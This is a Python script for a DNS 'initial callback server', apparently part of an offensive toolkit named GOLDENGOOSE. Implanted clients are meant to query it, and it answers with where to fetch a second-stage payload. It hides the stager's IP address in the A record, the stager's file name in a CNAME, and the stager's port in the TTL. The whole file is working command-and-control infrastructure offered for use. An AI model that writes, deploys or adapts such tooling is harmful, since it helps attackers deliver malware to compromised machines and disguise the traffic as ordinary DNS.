# For initial callbacks via DNS
import time
from dnslib import QTYPE,RR,A,CNAME
from dnslib.server import DNSServer, BaseResolver, DNSLogger

# The ip:port to receive a GOLDENGOOSE client from
STAGER_LISTEN_ADDR = "127.0.0.1"
STAGER_LISTEN_PORT = 8443
STAGER_FILE_NAME   = "WOWZERZ"

class CustomResolver(BaseResolver):
    def __init__(self, a_record, cname_record, stager_ip):
        self.a_record = a_record
        self.cname_record = cname_record
        self.stager_ip = stager_ip
    
    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        qtype = request.q.qtype
        #pdb.set_trace()
    
        if qtype == QTYPE.A:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.a_record), ttl=self.stager_ip))
            reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(self.cname_record), ttl=60))
        elif qtype == QTYPE.CNAME:
            reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(self.cname_record), ttl=60))
    
        return reply

def dns_server(a_record, cname_record, stager_ip, listen_address="0.0.0.0"):
    resolver = CustomResolver(a_record, cname_record, stager_ip)
    logger = DNSLogger()

    server = DNSServer(resolver, port=53, address=listen_address, logger=logger)
    server.start_thread()

if __name__ == '__main__':
    print("[+] Starting GOLDENGOOSE Initial Callback Server")
    dns_server(STAGER_LISTEN_ADDR, STAGER_FILE_NAME, STAGER_LISTEN_PORT)
    print("[+] DNS Server listening on:")
    print("[+]      IPv4: 0.0.0.0")
    print("[+]      Port: UDP 53")
    print("[+] listening for connections...")
    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        print("Exiting...")
    except Exception as e:
        print(f"Unhandled exception: {e}")
